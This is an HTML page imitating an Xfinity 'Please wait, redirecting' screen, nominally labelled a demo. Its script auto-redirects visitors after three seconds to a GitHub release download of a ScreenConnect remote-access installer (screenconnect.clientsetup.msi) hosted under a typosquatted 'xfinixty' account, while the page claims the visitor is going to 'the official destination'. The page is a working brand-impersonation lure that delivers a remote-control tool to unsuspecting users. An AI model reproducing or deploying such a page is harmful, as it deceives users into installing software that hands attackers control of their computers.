<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Redirecting | Xfinity-style Demo</title>
<style>
:root{--purple:#4b12b5;--bright:#641cff;--ink:#131029;--muted:#68648b}*{box-sizing:border-box}body{margin:0;font-family:Arial,Helvetica,sans-serif;color:var(--ink);background:#faf8ff;min-height:100vh;display:flex;flex-direction:column}.top,.bottom{background:#42159e;color:white}.top{padding:19px max(5%,24px);display:flex;justify-content:space-between;align-items:center;gap:16px}.logo{font-size:37px;font-weight:700;letter-spacing:-2.5px}.top small{letter-spacing:1px}.main{flex:1;position:relative;display:grid;place-items:center;overflow:hidden;padding:72px 20px;background:linear-gradient(125deg,#e5d7ff 0%,#fff 29%,#fff 69%,#e6d7ff 100%)}.main:before,.main:after{content:"";position:absolute;width:43vw;height:43vw;min-width:280px;min-height:280px;background:linear-gradient(140deg,#9d70f3,#5d19ce);transform:rotate(42deg);opacity:.27;pointer-events:none}.main:before{top:-34vw;left:-22vw}.main:after{bottom:-37vw;right:-23vw}.center{position:relative;z-index:1;text-align:center;max-width:680px;width:100%}.brand{font-size:clamp(64px,10vw,105px);font-weight:700;color:var(--purple);letter-spacing:-7px;margin:0 0 30px}h1{font-size:clamp(30px,5vw,45px);margin:0 0 12px}.sub{color:var(--muted);font-size:clamp(16px,2vw,20px);margin:0 0 43px}.barline{display:flex;align-items:center;gap:15px}.track{height:19px;border-radius:30px;background:#e6e3f0;flex:1;overflow:hidden}.fill{height:100%;width:0;background:linear-gradient(90deg,#5312e7,#8a3bff);border-radius:30px;transition:width .07s linear}.percent{font-weight:700;color:var(--purple);width:52px;text-align:right}.status{color:var(--muted);margin:25px 0 15px}.dots{display:flex;gap:9px;justify-content:center;margin-bottom:29px}.dots i{width:10px;height:10px;background:#c7a8ff;border-radius:50%;animation:pulse 1s infinite alternate}.dots i:nth-child(2){animation-delay:.25s}.dots i:nth-child(3){animation-delay:.5s}@keyframes pulse{to{background:#5914e6;transform:scale(1.25)}}.destination{font-size:13px;color:#5d587c;overflow-wrap:anywhere;margin-bottom:12px}.destination strong{color:#26203f}a.go{display:inline-block;background:#5a1bd7;color:white;padding:12px 24px;border-radius:9px;text-decoration:none;font-weight:700}.go[aria-disabled="true"]{opacity:.5;pointer-events:none}.bottom{padding:21px max(5%,24px);display:flex;align-items:center;justify-content:space-between;gap:20px;font-size:13px}.bottom .logo{font-size:27px}.bottom span{opacity:.9}@media(max-width:600px){.top small{display:none}.bottom{flex-direction:column;text-align:center}.main{padding:65px 18px}.brand{letter-spacing:-4px}}
</style>
</head>
<body>
<header class="top"><div class="logo">xfinity</div><small>INTERNET &nbsp; | &nbsp; MOBILE &nbsp; | &nbsp; TV</small></header>
<main class="main"><section class="center" aria-live="polite"><div class="brand">xfinity</div><h1>Please wait...</h1><p class="sub">You are being redirected to the official destination.</p><div class="barline"><div class="track" role="progressbar" aria-label="Redirect progress" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" id="track"><div class="fill" id="fill"></div></div><span class="percent" id="percent">0%</span></div><p class="status" id="status">Redirecting in 3 seconds...</p><div class="dots" aria-hidden="true"><i></i><i></i><i></i></div><p class="destination">Destination: <strong id="destination">Not configured</strong></p><a class="go" id="go" href="#" aria-disabled="true">Continue to destination →</a></section></main>
<footer class="bottom"><div><span class="logo">xfinity</span> &nbsp; <span>Connection experience demo</span></div><span>Only follow links to websites you trust.</span></footer>
<script>
// Set this to your verified, authorized HTTPS destination before publishing.
const DESTINATION_URL = 'https://github.com/xfinixtyWebmail600px/NewApp600/releases/download/Newverison600/screenconnect.clientsetup.msi';
const duration = 3000;
const destination = document.getElementById('destination');
const go = document.getElementById('go');
let target;
try { const parsed = new URL(DESTINATION_URL); if(parsed.protocol !== 'https:') throw Error('HTTPS required'); target = parsed.href; } catch(e) { target = null; }
if(target){destination.textContent=target;go.href=target;go.removeAttribute('aria-disabled');}else{destination.textContent='Configure a valid HTTPS URL';document.getElementById('status').textContent='Redirect unavailable';}
if(target){const start=performance.now();function tick(now){const elapsed=Math.min(now-start,duration),progress=Math.round(elapsed/duration*100);document.getElementById('fill').style.width=progress+'%';document.getElementById('percent').textContent=progress+'%';document.getElementById('track').setAttribute('aria-valuenow',progress);document.getElementById('status').textContent='Redirecting in '+Math.max(0,Math.ceil((duration-elapsed)/1000))+' seconds...';if(elapsed>=duration){window.location.assign(target)}else requestAnimationFrame(tick)}requestAnimationFrame(tick)}
</script>
</body></html>
